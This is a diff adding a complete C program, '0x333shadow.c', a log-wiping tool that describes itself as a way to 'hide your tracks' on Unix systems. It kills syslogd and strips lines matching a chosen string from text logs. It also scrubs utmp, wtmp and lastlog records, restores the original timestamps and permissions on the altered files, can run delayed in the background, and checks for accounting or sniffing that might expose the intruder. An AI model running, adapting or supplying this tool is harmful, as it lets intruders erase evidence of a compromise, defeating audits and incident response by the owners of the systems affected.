@@ -1,0 +1,818 @@
+/*
+ * ===================================================================================================================
+ *  ~ 0x333shadow.c => hide your tracks ~
+ * ===================================================================================================================
+ *
+ *  OS: Linux, FreeBSD, SunOS, IRIX
+ *
+ *  Linux:     gcc          0x333shadow.c -o 0x333shadow -D Linux
+ *  IRIX:      cc           0x333shadow.c -o 0x333shadow -D IRIX
+ *  FreeBSD:   gcc          0x333shadow.c -o 0x333shadow -D FreeBSD
+ *  SunOS:     cc/gcc       0x333shadow.c -o 0x333shadow -D SunOS -lsocket
+ *
+ * ===================================================================================================================
+ *
+ *  This program is for educational purposes only.
+ *  I'm not responsible any damages of this program.
+ *  Use it with your own risk.
+ * 
+ *  coded by nsn of outsiders. 
+ *  www.0x333.org
+ *
+ * ===================================================================================================================
+*/
+
+#define VERSION  "0.1"
+#define AUTHOR   "nsn of outsiders"
+#define TEAM     "0x333 Security Labs www.0x333.org"
+
+#include <stdio.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <dirent.h>
+#include <utmp.h>
+
+#ifndef FreeBSD
+   #include <lastlog.h>
+#endif
+
+#if defined(Linux) || defined(SunOS) || defined(IRIX)
+   #include <utmpx.h>
+#endif
+
+#include <pwd.h>
+#include <utime.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h> 
+#include <net/if.h> 
+#include <signal.h>
+#include <string.h>
+#include <sys/acct.h>
+
+#ifdef SunOS
+   #include <stropts.h>
+   #include <sys/sockio.h>
+   #include <sys/param.h>
+#endif   
+
+/* note, not used snprintf for IRIX problems on old versions */
+
+int isText(char *); /* check if a file is text format or not */
+void usage(char *); /* help for user */
+void clean(char *, char *); /* clean a dir, recursive scan */
+void check(char *, char *);  /* clean a file erasing all matching of input string */
+void cleanextra(char *); /* clean binary log files */
+void cleanwtmp(char *, char *); /* name is enough */
+void cleanwtmpx(char *, char *); /* same code of cleanwtmp, change only the structure, for clearness made this function */
+void cleanlastlog(char *, char *); /* name is enough :) */
+void syslogdanalysis(char *, char *); /* try get more information */
+int resetperm(char *, char *); /* rename newpath to oldpath and get all attributes of oldpath, date, permission etc */
+int readpid(char *); /* get a line (number) and convert it to integer, used for read pids by default files of syslogd */
+int killpid(int); /* return 0 if pid is succesfully killed */
+int killsyslogd(void); /* return if syslogd was killed or not */
+char *getsyslogdpath(char *, int); /* get path of syslogd, even if name isn't syslogd */
+char *getextraconf(char *); /* get if exists a -f conf, and get path of it */
+int getpidsysanotherway(char *); /* another way for get pid, if we don't found it, in defaults pid file */
+int checkFiles(char *[]); /* check if size of at least a file, is > 0, in case positive return 0 */
+long getSize(char *); /* return size of a file */
+void checkPromisc(void); /* check for interface setted in promisc mode */
+
+                                          /* default dir where watching */
+
+char     *defaultdirs[] =                 {   "/var/log",
+                                              "/var/adm",
+                                              "/usr/adm",
+                                              "/var/mail",
+                                              NULL
+                                          };    
+   
+                                          /* default files used by syslogd, where write his PID */
+                      
+char      *syslogdPIDS[] =                {
+                                              "/var/run/syslogd.pid",
+                                              "/var/run/syslog.pid",
+                                              "/etc/syslog.pid",
+                                              NULL
+                                          };                       
+
+                                          /* default conf files used by syslogd */
+   
+char      *syslogCONFS[] =                {
+                                              "/etc/syslog.conf",
+                                              "/etc/newsyslog.conf",
+                                              NULL
+                                          };
+
+                                          /* default acct paths */
+   
+char      *acctPATHS[]   =                {   
+                                              "/var/log/acct",
+                                              "/var/log/pacct",
+                                              "/var/adm/pacct",
+                                              "/var/account/acct",
+                                              NULL
+                                          };
+
+                                          /* default snoopy paths */
+   
+char      *snoopyPATHS[] =                {
+                                              "/lib/snoopy.so",
+                                              NULL
+                                          };   
+                   
+typedef struct {
+   char *paths[10]; /*  list of paths  */
+   char *desc;     /*  description    */
+}extra;
+
+extra logs[] = {    /* add more paths, if you need */
+
+  /*             paths                                                                             END     desc    */ 
+                      
+  { { "/var/adm/utmp","/usr/adm/utmp","/etc/utmp","/var/log/utmp","/var/run/utmp",                NULL }, "utmp"    },
+  { { "/var/adm/wtmp","/usr/adm/wtmp","/etc/wtmp","/var/log/wtmp",                                NULL }, "wtmp"    },
+  { { "/var/adm/utmpx","/usr/adm/utmpx","/etc/utmpx","/var/log/utmpx","/var/run/utmpx",           NULL }, "utmpx"   },
+  { { "/var/adm/wtmpx","/usr/adm/wtmpx","/etc/wtmpx","/var/log/wtmpx",                            NULL }, "wtmpx"   },
+  { { "/var/adm/lastlog","/usr/adm/lastlog","/etc/lastlog","/var/log/lastlog",                    NULL }, "lastlog" },
+  { NULL, NULL }
+  };
+
+
+void usage(char *prg)
+{
+int i = 0;
+
+   fprintf (stdout, "\n [~] 0x333shadow => hide your tracks version %s\n", VERSION);
+   fprintf (stdout, " [~]        coded by %s ~ %s        [~] \n\n", AUTHOR, TEAM);
+   fprintf (stderr, " Usage: %s [action] -i [string] -l [secs] -m [ dir1/file1 ] [ dir2/file2 ] [ ... ]\n", prg);
+   fprintf (stderr, " \nwhere action have to be:\n\n", prg);
+   fprintf (stderr, " \n");
+   fprintf (stderr, " \t-a\tclean all default dirs (recursive scan) you can use even -m. (include option -s, -b).\n");
+   fprintf (stderr, " \t-b\tclean only binary (utmp, wtmp, utmpx, wtmpx, lastlog) files.\n");
+   fprintf (stderr, " \n");
+   fprintf (stderr, " \nother options:\n\n");
+   fprintf (stderr, " \t-l\tclean after n secs, any system can log to logout, so you exit, and it try will clean (bg mode).\n");
+   fprintf (stderr, " \t-m\tspecify more dirs or text files (if you don't specify -a, -b, -s, default dirs and logs will be skipped ...\n");
+   fprintf (stderr, " \t                                         so only dirs/files specified will be cleaned).\n");
+   fprintf (stderr, " \t-i\tstring by search, choose it with sense ;)\n");
+   fprintf (stderr, " \t-s\tenable research other logs watching in syslogd newsyslog confs.\n");
+   fprintf (stderr, " \t-h\tshow this help.\n\n");
+
+   fprintf (stderr, " \t other auto actions: read the DOCUMENTATION.\n");
+   fprintf (stderr, " \t this tool watch in these directory by default: \n\n", prg);
+   
+   for (i = 0; defaultdirs[i] != NULL; ++i)
+      fprintf (stderr, " \t %s\n",defaultdirs[i]);
+      
+   fprintf (stderr, "\n \t correct use various example:\n\n");
+   fprintf (stderr, " \t %s -a -i string\n",prg);
+   fprintf (stderr, " \t %s -b -i string -s\n",prg);
+   fprintf (stderr, " \t %s -b -i string\n",prg);
+   fprintf (stderr, " \t %s -a -i string -l 60\n",prg);
+   fprintf (stderr, " \t %s -i string -m /var/log/messages\n",prg);
+   
+   exit(-333);
+}
+
+int killpid(int pid) { return (pid > 0 ? kill(pid,SIGKILL) : -1); }
+
+int readpid(char *path)
+{
+FILE *stream;
+char line[6]={"\0"};
+int proc = -1;
+
+   if ((stream = fopen(path,"r"))) {
+
+      fread(line,1,sizeof(line),stream); 
+      fclose(stream);  
+
+      if (line)
+         proc = atoi(line);
+      
+   }
+      
+return proc;
+}
+
+int getpidsys(void)
+{
+int i, pid = -1;
+
+  for (i = 0; syslogdPIDS[i] != NULL && pid < 0; ++i)
+     pid = readpid(syslogdPIDS[i]);
+
+return pid;      
+}
+
+int getpidsysanotherway(char *command)
+{
+FILE *ps;
+char cmd[255]={"\0"};
+int pid = -1;
+
+      if ((ps = popen(command,"r"))) {
+   
+         memset(cmd,0,sizeof(cmd));
+         fgets(cmd,sizeof(cmd),ps);
+   
+         if (cmd)
+            pid = atoi(cmd);
+            
+         pclose(ps);
+         
+      }   
+
+return pid;
+}
+
+char *getextraconf(char *string)
+{
+static char *value = NULL;
+int i;
+
+   if ((value = strstr(string,"-f"))) {
+
+      value = ((value[2] == ' ') ? value+3 : value+2);
+
+      for (i = 0; i < strlen(value); ++i)
+         if ((value[i] == ' ') || (value[i] == '\t'))
+            value[i] = '\0'; 
+
+   }
+
+return value;
+}
+
+char *getsyslogdpath(char *pspath, int pid)
+{
+FILE *ps;
+static char cmd[255]={"\0"};
+
+   /* 
+        use /proc isn't a portable way, format change and in some os doesn't exists
+        open a pipe to "ps" (in many case use /proc) and grep output can be a way, like coded here.  
+   */
+
+   if (pid > 0) {
+     
+      #if defined(SunOS) || defined(IRIX) || defined(Linux)
+         sprintf(cmd,"%s -ef | grep -w %d | grep -v grep | awk '{for(i=8;i<=NF;i++) printf(\"%%s \", $i); printf(\"\\n\")}'",pspath,pid);
+      #endif
+      
+      #if defined(FreeBSD)
+         sprintf(cmd,"%s -aux | grep -w %d | grep -v grep | awk '{for(i=8;i<=NF;i++) printf(\"%%s \", $i); printf(\"\\n\")}'",pspath,pid);
+      #endif   
+
+      if ((ps = popen(cmd,"r"))) {
+   
+         memset(cmd,0,sizeof(cmd));
+         fgets(cmd,sizeof(cmd),ps);
+         cmd[strlen(cmd)-1] = '\0';
+         pclose(ps);
+   
+      }
+   }    
+      
+return cmd;      
+}
+
+long getSize(char *path)
+{
+struct stat temp;
+long size = -1;
+
+   if (!stat(path,&temp))
+      size = temp.st_size;
+
+return size;
+}
+
+int checkFiles(char *paths[])
+{
+int i, status = -1;
+
+   for (i = 0; paths[i] != NULL && status; ++i)
+      if (getSize(paths[i]) > 0)
+         status = 0;      
+   
+return status;
+}
+
+void checkPromisc()
+{
+struct ifreq *info = NULL;
+struct ifconf list;
+int desc, i = 1, end = 0, err; 
+
+   if ((desc = socket(AF_INET, SOCK_DGRAM, 0)) >= 0) 
+   {
+
+       /* 
+          we increase buffer, until it is enough for read all, so we don't have need know how many interfaces 
+          are on the system. 
+          i = 1, is minium interface, that we try to read, if there are other interfaces, buffer will be increase.
+       */
+     
+      do
+      {
+         ++i;
+         memset(&list,0,sizeof(list));
+ 
+         if ((info = (struct ifreq *) realloc(info,sizeof(struct ifreq) * i))) {
+         
+             list.ifc_len = i * sizeof(struct ifreq);
+             list.ifc_req = info;
+
+             if (!(err = ioctl(desc, SIOCGIFCONF, (char *) &list)))
+                end = list.ifc_len / sizeof(struct ifreq);      
+
+          }
+          else printf("[*] fatal not enough memory... exiting!\n"); 
+   
+      }while(((sizeof(struct ifreq) * i) <= list.ifc_len) && (info) && (!err));
+  
+      printf("\n[*] founded %d interfaces on this system.\n\n",end);   
+
+      for (i = 0; i < end; ++i) {
+      
+         printf("[*] interface: %s status: ",info[i].ifr_name);
+   
+         if (!ioctl(desc, SIOCGIFFLAGS, &info[i]))
+            printf("%s\n", ((info[i].ifr_flags & IFF_PROMISC) ? "warning is in PROMISC MODE!" : "is in quiet mode." ));   
+      }
+
+      close(desc);
+  }
+	
+}
+
+int isText(char *path)
+{
+FILE *input;
+struct stat info;
+int status = 0, len = 0, i;
+char bytes[5] = {0x7f,0x45,0x4c,0x46,'\0'}, buf[5] = {"\0"};
+     
+   if ((input = fopen(path,"rb")) && (!stat(path,&info)) && (info.st_mode & S_IFREG)) {
+
+      len = fread(buf,1,4,input); 
+      fclose(input);  
+      
+      if ((strcmp(bytes,buf)))
+         status = 1;
+         
+      for (i = 0; i < len && status; ++i)
+         status = ( ((isprint(buf[i])) || (isspace(buf[i]))) ? 1 : 0 );
+
+   }
+   
+ return status;
+}
+
+int resetperm(char *path, char *newpath)
+{
+struct stat perm;
+struct utimbuf buf;
+int status = -1;
+
+ if (!(status = stat(path,&perm))) {
+   
+      rename(newpath,path);
+      chmod(path,perm.st_mode);
+      chown(path,perm.st_uid,perm.st_gid);
+
+      buf.actime = perm.st_atime;
+      buf.modtime = perm.st_mtime;
+      
+      utime(newpath,&buf);
+      
+ }
+ 
+return status;      
+}
+
+void clean(char *pathdir, char *string)
+{
+DIR *directory;
+struct stat record;
+struct dirent *info;
+char fullpath[255]={"\0"}, c;
+
+ /* if is a dir, we scan it, else if a regual file, try clean it */
+ 
+ if ((!stat(pathdir,&record)) && (record.st_mode & S_IFDIR)) {
+
+     if ((directory = opendir(pathdir))) {
+
+        while((info = readdir(directory))) {
+        
+           memset(fullpath,0,sizeof(fullpath));
+
+           if ((strlen(pathdir) + strlen(info->d_name) + 1) < (sizeof(fullpath) - 1)) {
+   
+              sprintf(fullpath,"%s/%s",pathdir,info->d_name);
+              stat(fullpath,&record);
+
+              if ((strcmp(".",info->d_name)) && (strcmp("..",info->d_name))) {
+
+                 if (record.st_mode & S_IFDIR)  
+                    clean(fullpath,string);
+                 else 
+                    check(fullpath,string);
+
+              }   
+           
+           }
+        }    
+        
+        closedir(directory);
+     }
+     else 
+        printf("[*] error in reading directory %s skipping.\n",pathdir);
+  }
+  else
+     check(pathdir,string);
+    
+}
+
+void check(char *path, char *string)
+{
+FILE *stream, *out;
+char outpath[255] ={"\0"}, buf[255] = {"\0"};
+unsigned long int lines = 0, total = 0;
+struct stat perm;
+
+   if ((isText(path)) && ((strlen(path) + 4) < (sizeof(outpath) - 1))) {
+
+      memset(outpath,0,sizeof(outpath));
+      sprintf(outpath,"%s.tmp",path);
+      
+      if ((stream = fopen(path,"r")) && ((out = fopen(outpath,"w")))) {
+
+         printf("[*] Cleaning %s ",path);  
+     
+         while(!feof(stream)) {
+     
+            memset(buf,0,sizeof(buf));
+            fgets(buf,sizeof(buf),stream);
+            ++total;
+        
+            if (!strstr(buf,string))
+              fputs(buf,out);
+            else
+              lines++;   
+           
+        }
+     
+          printf("removed %d/%d\n",lines,total-1);
+          fclose(stream);
+          fclose(out);
+       
+          if (resetperm(path,outpath)) 
+             printf("error in renaming/setting permission %s skipping.\n",path);
+          
+      }   
+      else
+         printf ("[*] error on reading file %s or touching file %s\n skipping.",path,outpath);
+   }
+}
+
+void cleanextra(char *string)
+{
+int i, j;
+
+   for (i = 0; logs[i].desc != NULL; ++i) {
+   
+      if ((!strcmp(logs[i].desc,"utmp")) || (!strcmp(logs[i].desc,"wtmp")))
+         for (j = 0; logs[i].paths[j] != NULL; ++j)
+            cleanwtmp(logs[i].paths[j],string);
+
+   #if defined (Linux) || defined(SunOS) || defined(IRIX)
+      if ((!strcmp(logs[i].desc,"utmpx")) || (!strcmp(logs[i].desc,"wtmpx")))
+         for (j = 0; logs[i].paths[j] != NULL; ++j)
+            cleanwtmpx(logs[i].paths[j],string);
+   #endif         
+
+      if ((!strcmp(logs[i].desc,"lastlog")) || (!strcmp(logs[i].desc,"lastlog")))
+         for (j = 0; logs[i].paths[j] != NULL; ++j)
+            cleanlastlog(logs[i].paths[j],string);
+                  
+  }
+}
+
+void cleanwtmp(char *path, char *string)
+{
+FILE *stream, *out;
+struct utmp info;
+char outpath[255]={"\0"};
+unsigned long int records = 0, total = 0;
+
+   memset(outpath,0,sizeof(outpath));
+
+   if ((strlen(path) + 4) < (sizeof(outpath) - 1))
+      sprintf(outpath,"%s.tmp",path);
+ 
+   if ((stream = fopen(path,"rb")) && ((out = fopen(outpath,"wb")))) {
+   
+      printf("[*] Cleaning %s ",path);  
+         
+      while (!feof(stream)) {
+      
+        memset(&info,0,sizeof(info));   
+
+        if (fread(&info,sizeof(info),1,stream)) {      
+
+           ++total;        
+   
+       #ifdef FreeBSD
+           if ((strstr(info.ut_name,string)) || (strstr(info.ut_host,string)))
+       #endif
+       
+       #if defined(IRIX) ||  defined(SunOS)   
+           if ((strstr(info.ut_user,string)))
+       #endif
+           
+       #ifdef Linux
+           if ((strstr(info.ut_user,string)) || (strstr(info.ut_host,string)))
+       #endif   
+       
+              records++;   
+           else
+              fwrite(&info,sizeof(info),1,out);
+        }    
+      }
+      
+       printf("removed %d/%d\n",records,total);
+       fclose(stream);
+       fclose(out);
+       
+       if (resetperm(path,outpath))
+          printf("[*] error in renaming/setting permission %s skipping.\n",path);
+   }
+   else
+      printf ("[*] error reading file %s or touching %s skipping.\n",path,outpath);
+
+}
+
+#if defined(Linux) || defined(SunOS) || defined(IRIX)
+void cleanwtmpx(char *path, char *string)
+{
+FILE *stream, *out;
+struct utmpx info;
+char outpath[255]={"\0"};
+unsigned long int records = 0, total = 0;
+
+   memset(outpath,0,sizeof(outpath));
+
+   if ((strlen(path) + 4) < (sizeof(outpath) - 1))
+      sprintf(outpath,"%s.tmp",path);
+ 
+   if ((stream = fopen(path,"rb")) && ((out = fopen(outpath,"wb")))) {
+   
+      printf("[*] Cleaning %s ",path);  
+         
+      while (!feof(stream)) {
+ 
+        memset(&info,0,sizeof(info));   
+
+        if (fread(&info,sizeof(info),1,stream)) {      
+
+           ++total;        
+   
+           if ((strstr(info.ut_user,string)) || (strstr(info.ut_host,string)))
+              records++;   
+           else
+              fwrite(&info,sizeof(info),1,out);
+        }    
+      }
+      
+       printf("removed %d/%d\n",records,total);
+       fclose(stream);
+       fclose(out);
+       
+       if (resetperm(path,outpath))
+          printf("[*] error in renaming/setting permission %s skipping.\n",path);
+   }
+   else
+      printf ("[*] error reading file %s or touching %s skipping.\n",path,outpath);
+}
+#endif
+
+void cleanlastlog(char *path, char *string)
+{
+FILE *stream;
+struct passwd *info;
+struct lastlog lstlog;
+unsigned long int records = 0, total = 0;
+
+   /* scanning all users */
+
+   if ((stream = fopen(path,"r+"))) {
+   
+      printf("[*] Cleaning %s ",path);  
+      
+      while ((info = getpwent())) {
+
+        memset(&lstlog,0,sizeof(lstlog));   
+        fseek(stream, sizeof(struct lastlog) * info->pw_uid, SEEK_SET);
+        		
+        if (fread(&lstlog,sizeof(lstlog),1,stream)) {      
+   
+           ++total;
+
+           if ((strstr(info->pw_name,string)) || (strstr(lstlog.ll_host,string))) {
+              records++;
+  		      lstlog.ll_time = 0;
+              memset(lstlog.ll_line,0,sizeof(lstlog.ll_line));
+              memset(lstlog.ll_host,0,sizeof(lstlog.ll_host));
+              fseek(stream, -1 * sizeof(struct lastlog), SEEK_CUR);
+              fwrite(&lstlog,sizeof(struct lastlog),1,stream);
+           }   
+        }
+      }  
+       printf("removed %d/%d\n",records,total);
+       fclose(stream);
+   }
+   else
+      printf ("[*] error reading file %s skipping.\n",path);
+}
+
+void syslogdanalysis(char *path, char *string)
+{
+FILE *stream;
+char magicline[1024]={"\0"}, *getpath;
+int i;
+
+   if ((stream = fopen(path,"r"))) {
+   
+      printf("[*] getting information %s\n\n",path);
+      
+      while(!feof(stream)) {
+      
+         memset(magicline,0,sizeof(magicline));
+         fgets(magicline,sizeof(magicline),stream);
+         
+         if (magicline[0] != '#') 
+         {
+         
+            if ((getpath = strchr(magicline,'/'))) {
+           
+              
+               for (i = 0; i < strlen(getpath); ++i)  
+                  if ((getpath[i] == '\n') || (getpath[i] == ',') || (getpath[i] == ' ') || (getpath[i] == '\t'))
+                     getpath[i] = '\0';
+
+               printf("[*] founded %s in %s if isn't empty log will be cleaned.\n",getpath,path);
+               check(getpath,string);
+            }  
+          }
+      }
+   }  
+   else
+      printf("[*] error reading file configuration %s\n",path);
+
+}
+
+int main(int argc, char *argv[])
+{
+char *syslogdpath, *extraconf, *string = NULL, action = 0;
+int i, SYS = 0, start = argc, TIME = 0;
+
+
+   while(( i = getopt (argc, argv, "abs:l:i:m:")) != EOF)
+   {
+      switch(i)
+      {
+
+         case 'a' :{  
+                      if (action) usage(argv[0]);
+                      else action = 'a';
+                   };break;   
+         case 'b' :{
+                      if (action) usage(argv[0]);
+                      else action = 'b';  
+                   };break;
+
+         /* 
+
+            note only an option can be used for these flags "ab" -a or -b.
+            if variable action "in case block" will be inizialited, then there user has specified more options. 
+         
+         */
+                   
+         case 'i' :  string = optarg;break; 
+         case 'm' :  start  = optind - 1;break;
+         case 'l' :  TIME   = atoi(optarg);break;
+         case 's' :  SYS    = 1;break;
+         case 'h' :  usage(argv[0]);
+         default  :  usage(argv[0]);
+         
+      }
+   }
+      
+   if (!string)
+      usage(argv[0]);
+      
+   if (getuid())
+      printf("i believe you have to be root, for run me. open your mind!\n");   
+   else {
+        
+      if (TIME) {
+      
+          if (fork())
+             exit(-3);
+          if (setsid() < 0)
+             exit(-3);
+          if (fork())
+  	         exit(-3);
+             
+          printf("\n[*] well i go sleep, %d secs and then will try execute specified action.\n",TIME);
+
+          sleep(TIME);          
+
+      }
+
+      i = getpidsys();     /* getting syslogd's pid */
+
+      if (i == -1) {
+        
+         printf("[*] trying another way for getting pid's syslogd (wasn't killed).\n");
+
+         #if defined(Linux) || defined(SunOS) || defined(IRIX)
+            i = getpidsysanotherway("ps -ef | grep syslogd | awk '{print $2}'");
+         #else
+            #if defined(FreeBSD)
+               i = getpidsysanotherway("ps -aux | grep syslogd | awk '{print $2}'");
+            #endif   
+         #endif
+            
+      }      
+
+      syslogdpath = getsyslogdpath("ps",i);     /* getting path */
+        
+      printf("\n%s\n", ( killpid(i) ? "[WARNING]: syslogd not killed!" : "[*] syslogd killed!" )); /* killing syslogd */    
+                
+      /* action -a (ALL) */  
+     
+      if (action == 'a') {
+   
+         for (i = 0; defaultdirs[i] != NULL; ++i) 
+            clean(defaultdirs[i],string);     /* clean default dirs */  
+        
+      }
+      
+      /* action -a ALL even binary logs, or action -b only BINARY logs */ 
+         
+      if ((action == 'a') || (action == 'b')) {
+
+         printf("\n[*] cleaning extra logs:\n\n");
+     
+         cleanextra(string);     /* clean extra logs (binary) */
+            
+      }   
+   
+      /* clean extra dirs/files (-m option) */
+     
+      for (i = start; (i < argc) && (argv[i][0] != '-') && (argv[i][0] != '\0'); ++i)         
+         clean(argv[i],string);
+        
+      if ((action == 'a') || (SYS)) {
+      
+         printf("\n[*] trying find other logs syslogd/newsyslogd attack :)\n\n");
+        
+         for (i = 0; syslogCONFS[i] != NULL ; ++i)
+            syslogdanalysis(syslogCONFS[i],string);     /* syslogd analysis */
+            
+      }      
+           
+      if ((strcmp(syslogdpath,"")) && (strcmp(syslogdpath," ")) && (!strstr(syslogdpath,":"))) {
+
+         if ((extraconf = getextraconf(syslogdpath))) {
+            printf("\n[*] getted a NOT DEFAULT file config's syslogd!\n\n");
+            syslogdanalysis(extraconf,string);
+         }   
+           
+         printf("\n[*] trying... restarting syslogd\n");     /* rehashing syslogd */   
+           
+     }
+     else
+        printf("\n[*] impossible restart syslogd no path found.\n");   
+           
+      
+     printf("%s\n", (!(checkFiles(acctPATHS)) ? "[*] WARNING acct is logging you!" : "[*] acct not detected." ));     /* checking acct */     
+      
+     printf("%s\n", (!(checkFiles(snoopyPATHS)) ? "[*] WARNING snoopy probably is logging you!" : "[*] snoopy not detected." ));      /* checking SNOOPY */
+        
+     printf("[*] checking interfaces in promisc mode...\n"); checkPromisc();       /* checking PROMISC INTERFACE */
+          
+     printf("\nclean completed, %s %s.\n",TEAM,AUTHOR);
+     
+  }
+        
+return 0;         
+}
+
